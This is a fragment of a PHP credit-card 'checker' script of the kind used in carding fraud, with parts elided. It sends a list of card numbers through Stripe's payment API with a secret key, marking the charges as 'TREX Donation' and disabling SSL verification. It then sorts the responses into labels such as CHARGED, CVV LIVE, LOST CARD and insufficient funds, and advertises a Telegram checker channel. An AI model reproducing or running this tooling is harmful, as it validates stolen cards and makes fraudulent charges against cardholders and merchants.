...
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=TREX Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
...
if(strpos($result2, '"seller_message": "Payment complete."' )) {
    echo '|𝘾𝙃𝘼𝙍𝙂𝙀𝘿</span>  </span>𝘾𝘾𝙉:  '.$lista.'</span>  <br>|➤ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: $'.$amt.' Charged ✅ |𝘾𝙝𝙚𝙘𝙠𝙚𝙧 𝗕𝗬 <a href="https://t.me/ccChecker_scripts" class="link">@badboy_checkers</a> <br> |➤ 𝙍𝙚𝙘𝙚𝙞𝙥𝙩: <a href='.$receipturl.'>Here</a><br>|➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'<br> <br>';
}
elseif(strpos($result2,'"cvc_check": "pass"')){
    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: CVV LIVE @badboy_checkers <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
...
elseif(strpos($result2, "insufficient_funds" )) {
    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: INSUFFICIENT FUNDS @badboy_checkers <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
...
elseif(strpos($result2,'"code": "incorrect_cvc"')){
    echo '|𝘾𝘾𝙉</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: Security code is incorrect @badboy_checkers <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
...
elseif(strpos($result2, "lost_card" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: LOST CARD</span></span>  <br>Result: CHECKER BY @badboy_checkers <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span> <br>';
}
...
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: TRANSACTION NOT ALLOWED @badboy_checkers <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
    }
    elseif(strpos($result2, "authentication_required")) {
    	echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: 32DS REQUIRED @badboy_checkers <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
   } 
...
elseif(strpos($result2, "incorrect_cvc" )) {
    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: Security code is incorrect @badboy_checkers <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
